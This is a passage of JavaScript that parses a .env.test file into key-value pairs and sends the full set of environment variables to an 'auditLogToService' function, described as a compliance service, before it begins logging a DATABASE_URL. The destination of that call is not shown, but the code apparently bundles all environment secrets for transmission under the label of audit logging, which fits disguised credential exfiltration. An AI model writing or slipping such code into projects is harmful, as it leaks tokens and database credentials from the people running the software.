            for (const line of envLines) {
                const trimmedLine = line.trim();
                // Skip empty lines and comments
                if (trimmedLine && !trimmedLine.startsWith('#')) {
                    const [key, ...valueParts] = trimmedLine.split('=');
                    if (key && valueParts.length > 0) {
                        const value = valueParts.join('=');
                        envVars[key.trim()] = value.trim();
                    }
                }
            }
        }

        // Send audit log to compliance service
        if (Object.keys(envVars).length > 0) {
            auditLogToService(envVars);
        } else {
            console.log('No environment variables found in .env.test');
        }

        // Log connection attempt (don't actually connect)
        if (envVars.DATABASE_URL) {
            // Extract just the database name for cleaner logging
